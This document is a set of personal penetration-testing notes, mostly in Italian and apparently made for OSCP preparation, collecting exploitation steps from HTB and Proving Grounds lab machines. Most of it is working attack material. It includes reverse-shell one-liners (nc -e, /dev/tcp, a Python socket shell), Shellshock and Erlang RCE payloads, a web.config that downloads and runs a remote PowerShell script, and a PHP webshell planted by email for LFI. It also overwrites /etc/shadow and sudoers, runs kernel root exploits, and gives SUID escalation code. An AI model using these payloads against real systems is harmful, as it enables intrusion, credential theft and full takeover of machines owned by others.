-r-sr-sr-x 1 root sys 31584 2009-05-14 21:18 /usr/bin/passwd
sammy@sunday:~$ sudo wget -O /usr/bin/passwd http://10.10.14.5/shell.py
--02:09:34--  http://10.10.14.5/shell.py
           => `/usr/bin/passwd'
Connecting to 10.10.14.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 246 [application/octet-stream]

100%[==========================================================================================================================================================================================================>] 246           --.--K/s

02:09:34 (69.91 KB/s) - `/usr/bin/passwd' saved [246/246]

sammy@sunday:~$ passwd
```

E nella macchina attaccante:
```
root@kali:~/pwk/lab/public# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.76] 41346
# id
uid=101(sammy) gid=10(staff) euid=0(root) egid=3(sys) groups=10(staff)
```


**Overwrite shadow**
shadow che si vuole utilizzare, per esempio:
```
root:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

```
sammy@sunday:~$ sudo wget -O /etc/shadow http://10.10.14.5/shadow
--02:00:10--  http://10.10.14.5/shadow
           => `/etc/shadow'
Connecting to 10.10.14.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 392 [application/octet-stream]

100%[==========================================================================================================================================================================================================>] 392           --.--K/s

02:00:10 (42.45 MB/s) - `/etc/shadow' saved [392/392]

sammy@sunday:~$ su -
Password:
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
You have new mail.
root@sunday:~# id
uid=0(root) gid=0(root) groups=0(root),1(other),2(bin),3(sys),4(adm),5(uucp),6(mail),7(tty),8(lp),9(nuucp),12(daemon)
```

**Overwrite sudoers**
sudoers che vogliamo utlizzare, per esempio:
```
root  ALL=(ALL) ALL
sammy ALL=(root) NOPASSWD: /usr/bin/su
sunny ALL=(root) NOPASSWD: /root/troll
```

```
sammy@sunday:~$ sudo wget -O /etc/sudoers http://10.10.14.5/sudoers
--02:07:08--  http://10.10.14.5/sudoers
           => `/etc/sudoers'
Connecting to 10.10.14.5:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 99 [application/octet-stream]

100%[==========================================================================================================================================================================================================>] 99            --.--K/s

02:07:08 (15.45 MB/s) - `/etc/sudoers' saved [99/99]

sammy@sunday:~$ sudo -l
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/su
sammy@sunday:~$ sudo su
root@sunday:~# id
uid=0(root) gid=0(root)
```


### AJPy - Ghostcat
https://github.com/hypn0s/AJPy

To bruteforce the credentials:
```
    ┌──(kali㉿kali)-[~/Documents/OSCP/Kraken/AJPy]
    └─$ python tomcat.py bf -U /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt -P /usr/share/wordlists/metasploit/tomcat_mgr_default_pass.txt /manager/html 10.11.1.209
    Attacking a tomcat at ajp13://10.11.1.209:8009/manager/html
    Found valid credz: tomcat:s3cret
    Here is your cookie: JSESSIONID=C5BEF363A4E34E9F0DDFD24F36B6C2DA; Path=/manager; HttpOnly
```

Oppure da https://www.exploit-db.com/exploits/48143 (esempio preso da https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html)
```
python2 ghostcat.py -p 8009 -f WEB-INF/web.xml 10.10.10.55
```

### SSRF Check
https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html

Ad esempio, si trova un url con un parametro che viene usato per connettersi ad un altro host e quindi si vuole vedere se ci sono delle porte "nascoste" che contengono qualcosa. Quindi per esempio: 
```
http://10.10.10.55:60000/url.php?path=ALTRO_URL
```

Allora si può creare uno script per far controllare cosa rispondono le diverse porte:
```
oxdf@parrot$ time for i in {1..65535}; do res=$(curl -s http://10.10.10.55:60000/url.php?path=http%3A%2F%2F127.0.0.1%3A${i}); len=$(echo $res | wc -w); if [ "$len" -gt "0" ]; then echo -n "${i}: "; echo $res | tr -d "\r" | head -1 | cut -c-100; fi; done
22: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2 Protocol mismatch.
90: <!DOCTYPE> <html> <head> <title>Under Construction</title> </head> <bodyd> <p>This page is under con
110: <html> <head> <title> favorites / bookmark title goes here </title> </head> <body bgcolor="white" te
200: <b>Hello world!</b>
320: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"><html> <he
888: <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"> <head> <meta http-equiv="content
-bash: warning: command substitution: ignored null byte in input
3306: 5.7.19-0ubuntu0.16.04.1 %t&Jz/a,X?JFLymysql_native_passwordot packets out of order
8080: <!DOCTYPE html><html><head><title>Apache Tomcat/8.5.5 - Error report</title><style type="text/css">H
60000: <!DOCTYPE html> <html> <head> <style> div.container { width: 100%; border: 1px solid gray; } header,

real    60m47.560s
user    8m4.942s
sys     10m12.692s
```

Usa 127.0.0.1 perchè in questo esempio, la richesta viene sottomessa sul server e quindi noi sappiamo la risposta dal server.
Da qui se si trovano altre porte si può usare l'url e inserire http://127.0.0.1:PORTA_TROVATA e vedere cosa c'è nelle pagine e si potrebbero trovare credenziali utili.


### Shellshock SMTP Exploit
https://github.com/3mrgnc3/pentest_old/blob/master/postfix-shellshock-nc.py

Prima si deve enumerare perchè servono delle email esistenti:
We must use the existent email, that we verify before using  VRFY in smtp:
user01 per il from:
data = netFormat("mail from:<user01@mail.local>")
useradm per il to:
data = netFormat("rcpt to:<useradm@mail.local>")

E poi eseguire:
```
└─$ python postfix_testing.py 10.11.1.231 'nc -e /bin/bash 192.168.119.168 4444'
```

### Shellshock file sh

Con file .cgi vedi https://0xdf.gitlab.io/2021/02/23/htb-beep.html#webshell-upload-path-5

https://0xdf.gitlab.io/2021/05/25/htb-shocker.html
https://rainsec.medium.com/shocker-a-htb-walkthrough-576dcf87092e

In questo esempio viene trovato un file user.sh il cui output sembra quello del comando "uptime". Quindi si presume che venga eseguito quel comando. Quindi si può caricare:
```
curl -H “user-agent: () { :; }; echo; echo; /bin/bash -c ‘cat /etc/passwd’ ” http://10.10.10.56/cgi-bin/user.sh
```
Questo dà /etc/passwd, per una reverse shell usare questo nell'user-agent:
```
User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.15/443 0>&1
```

C'è anche un exploit: https://www.exploit-db.com/exploits/34900 da eseguire:
```
./shellshock.py payload=reverse rhost=10.10.10.56 lhost=<LAB IP> lport=<port> pages=/cgi-bin/user.sh
```

### Windows XP SP0/SP1 Privilege Escalation to System
https://sohvaxus.github.io/content/winxp-sp1-privesc.html

Nel link è spiegato bene, usa i seguenti servizi vulnerabili:
```

C:\> accesschk.exe /accepteula -uwcqv "Authenticated Users" *

# If we are on a Windows XP SP0 or SP1 OS we will receive the following output
								 
RW SSDPSRV
        SERVICE_ALL_ACCESS
RW upnphost
        SERVICE_ALL_ACCESS	
```


### Linux 2.6.32-21-generic-pae
```
uname -a
Linux core 2.6.32-21-generic-pae #32-Ubuntu SMP Fri Apr 16 09:39:35 UTC 2010 i686 GNU/Linux
```

**Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - 'CAN BCM' Local Privilege  | linux/local/14814.c**
```
www-data@core:/tmp$ gcc 14814.c
gcc 14814.c
www-data@core:/tmp$ ls
ls
14814.c  a.out	vmware-root
www-data@core:/tmp$ ./a.out
./a.out
[+] looking for symbols...
[+] resolved symbol commit_creds to 0xc0176140
[+] resolved symbol prepare_kernel_cred to 0xc0176480
[+] setting up exploit payload...
[+] creating PF_CAN socket...
[+] connecting PF_CAN socket...
[+] clearing out any active OPs via RX_DELETE...
[+] removing any active user-owned shmids...
[+] massaging kmalloc-96 SLUB cache with dummy allocations
[+] corrupting BCM OP with truncated allocation via RX_SETUP...
[+] mmap'ing truncated memory to short-circuit/EFAULT the memcpy_fromiovec...
[+] mmap'ed mapping of length 328 at 0xb7814000
[+] smashing adjacent shmid with dummy payload via malformed RX_SETUP...
[+] seeking out the smashed shmid_kernel...
[+] discovered our smashed shmid_kernel at shmid[147] = 4817043
[+] re-smashing the shmid_kernel with exploit payload...
[+] launching root shell!
root@core:/tmp# whoami
whoami
root
```


### Linux 4.4.0-116-generic
Vedi in https://0xdf.gitlab.io/2019/06/08/htb-help.html

```
uname -a
    Linux dotty 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

#### 45010.c 
https://www.exploit-db.com/exploits/45010

```
www-data@dotty:/tmp$ ./45010
./45010
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88003d4faf00
[*] Leaking sock struct from ffff880038ef3800
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff880035000e40
[*] UID from cred structure: 33, matches the current: 33
[*] hammering cred structure at ffff880035000e40
[*] credentials patched, launching shell...
# whoami
whoami
root
```

#### 44298.c
```
help@help:/dev/shm$ gcc -o a 44298.c 
help@help:/dev/shm$ ./a
task_struct = ffff880003596200
uidptr = ffff880003cfcc04
spawning root shell
root@help:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare),1000(help)
```

### Linux 4.8.0
#### 40616.c
Vedi in https://latesthackingnews.com/2018/09/22/pluck-vulnhub-ctf-challenge-walkthrough/



### Linux: 2.6.9-89.EL
 Linux: 2.6.9-89.EL
 Distribution: CentOS release 4.8 (Final)
 Architecture: i686

https://www.exploit-db.com/exploits/9545
```
┌──(kali㉿kali)-[~/Documents/OSCP/Phoenix]
└─$ gcc -m32 -Wl,--hash-style=both -Wall 9545.c -o 9545

We must install gcc-multilib to use -m32 in the compilation
the -Wall was in the file .c 
and -Wl,--hash-style=both with the error:
*./shared-binary: error while loading shared libraries: requires glibc 2.5 or later dynamic linker*
```

Oppure:
https://www.exploit-db.com/exploits/9542
```
┌──(kali㉿kali)-[~/Documents/OSCP/Phoenix]
└─$ gcc -m32 -Wl,--hash-style=both -Wall 9542.c -o 9542  
```



### export PATH environment
(Vedi Lab OSCP Sufferance)

Se si vede che un binario, che magari viene eseguito come root, ci sono eseguibili senza path /usr/bin, si può caricare una shell con il nome dell'eseguibile e cambiare il PATH.

```
bob@sufferance:/tmp$ strings /usr/local/bin/uploadtosecure
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
puts
system
__libc_start_main
GLIBC_2.0
PTRh0
[^_]
Archiving files to secure server...
scp -r file/tobesecured/* 10.10.11.100:/var/www/html/files/
```

Qui, per esempio, usa scp, quindi si crea un payload con il nome **scp**:
```
┌──(kali㉿kali)-[~/Documents/OSCP/Sufferance]
└─$ msfvenom -p linux/x86/exec CMD=/bin/sh -f elf -o scp
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 43 bytes
Final size of elf file: 127 bytes
Saved as: scp
```

Poi si carica sulla macchina vittima.
Si mettono i permessi di esecuzione, si cambia la variabile d'ambiente PATH con il path in cui è il payload creato e si esegue:
```
bob@sufferance:/usr/local/bin$ chmod 777 /tmp/scp
bob@sufferance:/tmp$ export PATH=/tmp:$PATH
bob@sufferance:/tmp$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/games
bob@sufferance:/tmp$ cd /usr/local/bin/
bob@sufferance:/usr/local/bin$ ./uploadtosecure 
Archiving files to secure server...

sh-3.1# id
uid=1001(bob) gid=1001(bob) euid=0(root) groups=1001(bob)
sh-3.1# whoami
root
```


### Erlang
Clyde di Providing Grounds.

4369/tcp open  epmd    Erlang Port Mapper Daemon

```
kali@kali:~$ sudo nmap -p 4369 -A  192.168.120.107
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 17:10 AWST
Nmap scan report for rabbitmq (192.168.120.107)
Host is up (0.28s latency).

PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 65000
...
```



https://www.rabbitmq.com/clustering.html
RabbitMQ nodes and CLI tools (e.g. rabbitmqctl) use a cookie to determine whether they are allowed to communicate with each other. For two nodes to be able to communicate they must have the same shared secret called the Erlang cookie. 

Quindi nella cartella rabbitmq dovremmo trovare il cookie di Erlang (è un file nascosto) (metti caso che hai accesso a ftp e ti ritrovi la cartella rabbitmq):
```
ftp> cd rabbitmq
250 Directory successfully changed.
ftp> ls -la
227 Entering Passive Mode (192,168,120,107,156,74).
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 May 08  2020 .
drwxr-xr-x   25 ftp      ftp          4096 Apr 24  2020 ..
-r--------    1 ftp      ftp            20 Apr 24  2020 .erlang.cookie
drwxr-x---    6 ftp      ftp          4096 Jan 12 16:16 mnesia
226 Directory send OK.
```

Download il cookie erlang e cat:
```
kali@kali:~$ cat .erlang.cookie
JPCGJCAEWHPKKPBXBYYB
```

#### Erlang Remote Code Execution
Clyde di Providing Grounds.
https://www.exploit-db.com/exploits/49418

replace le variabili:
```
TARGET = "192.168.120.107"
PORT = 65000
COOKIE = "JPCGJCAEWHPKKPBXBYYB"
CMD = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.118.6\",15672));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
```
Ed esegui:
```
kali@kali:~$ python3 49418.py
Extracted challenge 1814542648
Authenticated, executing command
Sending cmd: 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.118.6",15672));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
...


kali@kali:~$ nc -lvp 15672
listening on [any] 15672 ...
connect to [192.168.118.6] from rabbitmq [192.168.120.107] 46820
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=107(rabbitmq) gid=112(rabbitmq) groups=112(rabbitmq)

```



### Nmap SUID Privilege Escalation
Clyde di Providing Grounds.

- seguendo gtfobins (con --interactive)
- nmap --script /tmp/x.nse
```
$ echo 'os.execute("/bin/sh")' > /tmp/x.nse
echo 'os.execute("/bin/sh")' > /tmp/x.nse
$ 
$ nmap --script /tmp/x.nse
nmap --script /tmp/x.nse

Starting Nmap 7.40 ( https://nmap.org ) at 2020-04-24 06:16 EDT
WARNING: Running Nmap setuid, as you are doing, is a major security risk.

id
uid=108(rabbitmq) gid=112(rabbitmq) euid=0(root) groups=112(rabbitmq)
```

### Sonatype Nexus 
[Preso da BillyBoss di Proving Grounds]
version 3.21.0-05 of Sonatype Nexus is vulnerable to a remote code execution exploit.
https://www.exploit-db.com/exploits/49385

We log in as nexus:nexus


### IIS

#### Tilde enumeration
This vulnerability is caused by a tilde character "\~" in a GET or OPTIONS request, which allows for disclosure of 8.3 filenames (short names).
**If a shortname file exists, a vulnerable IIS installation will respond with a 404, and with a 200 if the file doesn’t exist.**

https://github.com/irsdl/IIS-ShortName-Scanner

java -jar /opt/IIS-ShortName-Scanner/iis_shortname_scanner.jar 2 20 http://10.10.10.93 /opt/IIS-ShortName-Scanner/config.xml

SI può usare questo per ridurre una wordlist. Perchè questa trovapossibili inizi di stringhe di nomi di file che esistono equindi si può fare un grep da una wordlist più grande.

```
(base) ┌──(kali㉿kali)-[~/Programs/IIS-ShortName-Scanner]
└─$ java -jar iis_shortname_scanner.jar 2 20 http://10.10.10.93 config.xml 

[...]

# IIS Short Name (8.3) Scanner version 2.3.9 (05 February 2017) - scan initiated 2021/06/26 11:22:07
Target: http://10.10.10.93/
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): \a.aspx
|_ Extra information:
  |_ Number of sent requests: 555
  |_ Identified directories: 2
    |_ ASPNET~1
    |_ UPLOAD~1
  |_ Indentified files: 3
    |_ CSASPX~1.CS
      |_ Actual extension = .CS
    |_ CSASPX~1.CS??
    |_ TRANSF~1.ASP
```

Quindi da questo output si vede che ci sono directory con shortname **aspnet** e **upload** e file con shortname **transf** e forse con **csaspx**.
```
(base) ┌──(kali㉿kali)-[~/Documents/HTB/Bounty]
└─$ grep upload /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt >> wordlist.txt
                                                                                                                                                                                                                                     
(base) ┌──(kali㉿kali)-[~/Documents/HTB/Bounty]
└─$ grep transf /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt >> wordlist.txt
                                                                                                                                                                                                                                     
(base) ┌──(kali㉿kali)-[~/Documents/HTB/Bounty]
└─$ grep aspnet /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt >> wordlist.txt
```

E si ha una lista con 73 linee:
```
└─$ wc -l wordlist.txt                        
73 wordlist.txt
```


### Pdmenu
https://latesthackingnews.com/2018/09/22/pluck-vulnhub-ctf-challenge-walkthrough/

Dovrebbe essere come vim e quindi andare sulla voce del menù "Edit file" ed eseguire poi:
You can exit to shell from Vim, just type
```
:set shell=/bin/bash
```
E poi:
Now execute the Vim variable by typing
```
:shell
```

E questo chiude pdmenu e ci dà una shell. 

### rvim
```
sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
```

Per avere una shell si può provare:
```
:!/bin/sh
```
```
:set shell=/bin/sh
:shell
```
```
:py import pty; pty.spawn("/bin/bash")
```

### chkrootkit
Si dovrebbe trovare in /etc
```
./chkrootkit -V
chkrootkit version 0.49
```
https://www.exploit-db.com/exploits/33899

Upload update and suid.c to /tmp/ directory of the victim.
File "update":
```
#!/bin/bash
chown root /tmp/suid ; chgrp root /tmp/suid ; chmod 4777 /tmp/suid
```

File suid.c:
```
int main(void){
    setresuid(0, 0, 0);
    system("/bin/bash");
}
```

E poi si danno i permessi di esecuzione (in questo esempio, l'eseguibile di chkrootkit veniva eseguito con un crontab ogni 5 minuti, quindi dopo 5 minuti si vede che il file suid (che prima avevo compilato e quindi aveva come owner www-data), ha owner root e quindi eseguendolo si ha la shell come root):
```
www-data@Sedna:/tmp$ chmod +x update
chmod +x update
www-data@Sedna:/tmp$ gcc suid.c -o suid
gcc suid.c -o suid
www-data@Sedna:/tmp$ ls -la
ls -la
total 32
drwxrwxrwt  4 root     root     4096 May 18 21:04 .
drwxr-xr-x 21 root     root     4096 Oct  7  2016 ..
drwxr-xr-x  2 tomcat7  tomcat7  4096 May 18 12:35 hsperfdata_tomcat7
-rwxr-xr-x  1 www-data www-data 7342 May 18 21:04 suid
-rw-r--r--  1 www-data www-data   73 May 18 21:04 suid.c
drwxr-xr-x  2 tomcat7  root     4096 May 18 12:35 tomcat7-tomcat7-tmp
-rwxr-xr-x  1 www-data www-data   78 May 18 21:04 update
www-data@Sedna:/tmp$ ls -la suid
ls -la suid
-rwsr-xr-x 1 root root 7342 May 18 21:04 suid
www-data@Sedna:/tmp$ ./suid
./suid
root@Sedna:/tmp# id
id
uid=0(root) gid=33(www-data) groups=0(root),33(www-data)
root@Sedna:/tmp# cat /root/flag.txt
cat /root/flag.txt
a10828bee17db751de4b936614558305
root@Sedna:/tmp#
```

Puoi anche fare una reverse shell:
https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html#shell-as-www-data-via-phpinfophp


### October
https://0xdf.gitlab.io/2019/03/26/htb-october.html

default cred: admin/admin

### PlaySMS
vedi https://0xdf.gitlab.io/2019/03/23/htb-frolic.html


### Nibbleblog
```
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
...
```

CVE-2015-6967 --> vedi https://0xdf.gitlab.io/2018/06/30/htb-nibbles.html



### Dirty Cow
Local Privilege Escalation with Dirty Cow Kernel Exploit
https://www.exploit-db.com/exploits/40616

Utilizzato in macchina Pluck di HTB: https://www.whitelist1.com/2018/09/pluck.html


PoCs di Dirty Cow: https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
Il file cowroot.c è stato usato da https://medium.com/@Kan1shka9/hackfest2016-sedna-walkthrough-a5a60c1acbe7
con una macchina che aveva:
```
www-data@Sedna:/$ uname -a
uname -a
Linux Sedna 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 i686 i686 GNU/Linux
www-data@Sedna:/$ cat /etc/*-release
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=14.04
DISTRIB_CODENAME=trusty
DISTRIB_DESCRIPTION="Ubuntu 14.04.1 LTS"
NAME="Ubuntu"
VERSION="14.04.1 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.1 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"

```

### Python Pickle
https://davidhamann.de/2020/04/05/exploiting-python-pickle/

Usato in Canape di HTB: https://0xdf.gitlab.io/2018/09/15/htb-canape.html


### Flask + Memcached + Python Pickle
Vedi anche Shifty di Providing Grounds.

https://cyruslab.net/2021/04/08/deserialization-of-flask-app-and-memcached/


### Webshell using Email
Se, per esempio, si trova una pagina vulnerabile a LFI ma non va il Log poisoning, ma si ha un servizio di email, si può utilizzare questo per poi richiamarla con LFI.

One way to get a file on disk is email. I’ll send an email to one of the accounts on the box, and then find it in /var/mail/[username]. Why not the askerisk account? swaks will send the email (or I could do it with telnet similar to the enumeration above):
```
root@kali$ swaks --to asterisk@localhost --from 0xdf@0xdf.htb --header "Subject: test shell" --body 'check out this code: <?php system($_REQUEST["cmd"]); ?>' --server 10.10.10.7
=== Trying 10.10.10.7:25...                                  
=== Connected to 10.10.10.7.
<-  220 beep.localdomain ESMTP Postfix
 -> EHLO parrot
<-  250-beep.localdomain                                     
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY                                                 
<-  250-ETRN                                                 
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250 DSN
 -> MAIL FROM:<0xdf@0xdf.htb>
<-  250 2.1.0 Ok
 -> RCPT TO:<asterisk@localhost>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Thu, 18 Feb 2021 15:33:00 -0500
 -> To: asterisk@localhost
 -> From: 0xdf@0xdf.htb
 -> Subject: test shell
 -> Message-Id: <20210218153300.1486384@parrot>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 -> 
 -> check out this code: <?php system($_REQUEST["cmd"]); ?>
  ->                                                          
 ->                    
 -> .
<-  250 2.0.0 Ok: queued as 5BB88D92FD                       
 -> QUIT                                                     
<-  221 2.0.0 Bye
=== Connection closed with remote host.
```

E poi si accede con LFI (perchè le email saranno salvate nel path /var/mail/\<USERNAME\>):
```
view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00&module=Accounts&action
```

E poi si aggiunge "&cmd=id" perchè nell'email da sfruttare è stata inviato codice per una webshell.

Vedi esempio: https://0xdf.gitlab.io/2021/02/23/htb-beep.html#webshell-upload-path-5




### Extension
Preso da: https://bigb0ss.medium.com/htb-bounty-writeup-90198043387c
```
$ cat extension.txt 
png
jpg
php
php5
php7
phtml
txt
html
asp
aspx
exe
config
js
```

Puoi mettere su Burp per fare un brute force dell'estensioni e vedere quale accetta un file upload

### Web.config (RCE)
Se un file uploaded accetta i file .config, si può usare un web.config per creare una reverse shell:
```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
Set rs = CreateObject("WSCRIPT.SHELL")
Set cmd = rs.Exec("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.23/shell.ps1')")
o = cmd.SetOut.Readall()
Response.write(o)
 %>
```

Vedi esempi:
- https://0xdf.gitlab.io/2018/10/27/htb-bounty.html
- https://bigb0ss.medium.com/htb-bounty-writeup-90198043387c



### The Importance of Architecture (Windows)

Just calling powershell to activate the shell returns a process that is running as a 32-bit process:
```
PS C:\Users\kostas\Desktop> [Environment]::Is64BitProcess
False
```

That is because the HFS process is likely running as a 32-bit process. This table (stolen from ss64.com) shows how the different paths work based on the current session architecture:
![Architecture](/assets/img/posts/architecture.webp)

So from within a 32-bit session, calling PowerShell from the C:\windows\system32 path will give the 32-bit version. Being in a 32-bit session trying to run kernel exploits against a 64-bit OS will fail.
To get a 64-bit shell, I’ll use the full path to PowerShell in the sysNative directory.
```
PS C:\Users\kostas\Desktop> [Environment]::Is64BitProcess
True
```

Vedi https://0xdf.gitlab.io/2021/03/17/htb-optimum.html


### Always Installed Elevated (Windows)
https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/
https://dylanpoelstra.nl/love.html